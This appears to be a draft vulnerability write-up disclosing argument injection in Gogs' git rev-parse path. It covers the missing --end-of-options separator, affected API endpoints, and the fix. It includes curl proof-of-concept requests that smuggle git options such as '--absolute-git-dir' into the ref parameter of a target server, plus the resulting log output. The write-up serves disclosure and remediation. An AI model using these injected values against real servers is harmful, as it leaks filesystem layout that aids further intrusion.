---
title: "The Missing --end-of-options: Argument Injection in Gogs' rev-parse Path"
date: 2026-07-24
categories: ["Blog"]
tags: ["Gogs", "Git", "Argument Injection", "CWE-88", "Web Security", "Research"]
author: "z3r0s"
draft: true
---

Gogs shells out to `git` a lot. Its a self-hosted Git service written in Go, and under the hood plenty of its API endpoints turn your request into a `git` command line and run it. Any time a web app builds a command line out of user input, the interesting question is whether your input can stop being an argument and start being an option. In Gogs' `rev-parse` path it can, and the reason is one missing separator. Tracked here as **CVE-XXXX-XXXXX** (pending assignment).

## What --end-of-options actually does

Git subcommands take options (things starting with `-`) and operands (paths, refs, SHAs). Git figures out which is which positionally, and it keeps treating leading-dash tokens as options until you tell it to stop. `--end-of-options` is how you tell it to stop. Everything after that separator is treated as an operand, no matter what it looks like.

So if you run:

```bash
git rev-parse --end-of-options "$USER_INPUT"
```

then `$USER_INPUT` is always interpreted as a revision to parse, even if the user typed `--absolute-git-dir`. Without the separator:

```bash
git rev-parse "$USER_INPUT"
```

a `$USER_INPUT` of `--absolute-git-dir` is parsed as the *option* `--absolute-git-dir`, and now the user is driving git's behavior instead of naming a commit. That is the entire bug class: CWE-88, argument injection.

## The inconsistency that gives it away

Here is `RevParse` in the `gogs/git-module` library (v1.8.8), at `repo.go:590-607`:

```go
func (r *Repository) RevParse(rev string, opts ...RevParseOptions) (string, error) {
    cmd := NewCommand("rev-parse").AddOptions(opt.CommandOptions)
    stdout, err := cmd.AddArgs(rev).RunInDirWithTimeout(opt.Timeout, r.path)
    // ...
}
```

`rev` goes straight in as an argument with no separator in front of it. Now compare that to other functions in the *same library*, which get it right. `DeleteBranch` uses `--end-of-options` (repo_reference.go:284). So does `MergeBase` (repo_pull.go:36). So does `ShowRefVerify` (repo_reference.go:59). The maintainers know the pattern. They apply it deliberately in several places. `RevParse` just got missed.

That is what makes this satisfying to find. You dont have to guess whether the defense was intended. You can see it used correctly a few files over, which means the fix is not a design change, its bringing one straggler in line with the convention the project already follows.

## From an API endpoint to git rev-parse

`RevParse` isnt some internal helper nobody reaches. It gets called by `CatFileCommit` (repo_commit.go:98), which resolves a ref to a commit, and that sits behind a whole set of authenticated API endpoints. Any of these will carry your input down to `git rev-parse`:

- `GET /api/v1/repos/:owner/:repo/contents?ref=PAYLOAD`
- `PUT /api/v1/repos/:owner/:repo/contents/*` (the `branch` field in the request body)
- `GET /api/v1/repos/:owner/:repo/git/trees/:sha`
- `GET /api/v1/repos/:owner/:repo/git/blobs/:sha`
- `GET /api/v1/repos/:owner/:repo/commits/:sha`
- `GET /api/v1/repos/:owner/:repo/raw/*` (through the `RepoRef` middleware)

The `ref`, `sha`, and `branch` values are all meant to name a git object. None of them is filtered for leading dashes before it reaches `RevParse`, so any of them can smuggle in an option instead.

## The PoC

This is on Gogs 0.15.0+dev (current main), Linux. You need a valid API token, and a repo you can read, which for an authenticated user is trivially satisfied by your own repo.

Leak the repository's filesystem path with `--absolute-git-dir`:

```bash
TOKEN="<your-api-token>"
curl -s -H "Authorization: token $TOKEN" \
  "http://TARGET:3000/api/v1/repos/YOUR_USER/test-repo/contents?ref=--absolute-git-dir"
```

The API itself gives you nothing useful:

```json
{"message":"Something went wrong, please check the server logs for more information."}
```

But `git rev-parse --absolute-git-dir` ran, and when Gogs logs the error it logs git's stderr, which contains the resolved path:

```
[ERROR] NotFoundOrError() get commit: exit status 128 - fatal: Not a valid object name /data/gogs/repos/YOUR_USER/test-repo.git
```

Git tried to treat the *output* of `--absolute-git-dir` as an object name, failed, and printed the absolute path in the failure. Same trick works for other read-only git options:

```bash
# Confirm the repo is bare
curl -s -H "Authorization: token $TOKEN" \
  "http://TARGET:3000/api/v1/repos/YOUR_USER/test-repo/contents?ref=--is-bare-repository"
# Server log: "Not a valid object name true"

# Get the git common directory
curl -s -H "Authorization: token $TOKEN" \
  "http://TARGET:3000/api/v1/repos/YOUR_USER/test-repo/contents?ref=--git-common-dir"
# Server log: "Not a valid object name ."
```

From my local test the three probes produced exactly:

```
[ERROR] get commit: exit status 128 - fatal: Not a valid object name /tmp/hunt-gogs/data/repos/testadmin/test-repo.git
[ERROR] get commit: exit status 128 - fatal: Not a valid object name true
[ERROR] get commit: exit status 128 - fatal: Not a valid object name .
```

## Being honest about impact

I want to be straight about what this gets you, because it is easy to oversell argument injection. The leaked information goes to the *server-side logs*, not to the API response. The response is a generic error. So this is not a case where an unprivileged attacker reads arbitrary data over HTTP and walks away.

What it is: server-side information disclosure to anyone who can see the logs. The leaked paths reveal the OS layout, the Gogs installation and data directory structure, and the service account username baked into the path. That is genuinely useful if the logs are reachable, through a shared log aggregation pipeline, a separate log-exposure bug, admin access, or a container where stderr is visible. And it is useful as a stepping stone. Absolute paths are exactly what you want in hand before you try to chain a path traversal or an LFI somewhere else in the stack, because they take the guesswork out of "where does this thing actually live on disk".

The reachable surface is also wider than just `RevParse`. The same missing-separator pattern shows up in `Checkout` (repo.go:310) and `CatFileType` (repo_commit.go:144), so the fix should cover all three, not just the one endpoint you happened to test first.

## Not the first time

This is the same bug class as CVE-2024-39933, which was git argument injection in Gogs via tag names, fixed by stripping leading dashes. That fix hardened the tag path. It did not touch `RevParse`. So this is an incomplete-fix story: the project patched one instance of "user input reaches a git command line as a potential option", and this is another instance of the identical problem that the earlier fix didnt reach. Bug classes dont get fixed one call site at a time without something enforcing the pattern everywhere.

## The fix

Add the separator, everywhere user input reaches a git command line. For `RevParse`:

```go
cmd.AddArgs("--end-of-options", rev)
```

and the same for `Checkout` and `CatFileType`. Since three sibling functions in this exact library already do this, the cleaner long-term move is to make it the default in the command builder for any subcommand that accepts refs, so a future `rev-parse`-shaped function cant forget it. Stripping leading dashes from the input works too, but `--end-of-options` is the git-blessed way to say "this token is data, not a flag", and it doesnt mangle legitimate refs that happen to be unusual.

*Found by z3r0s (https://github.com/z3r0s6) via manual source review of Gogs 0.15.0+dev and gogs/git-module v1.8.8. CWE-88, CVE pending assignment.*
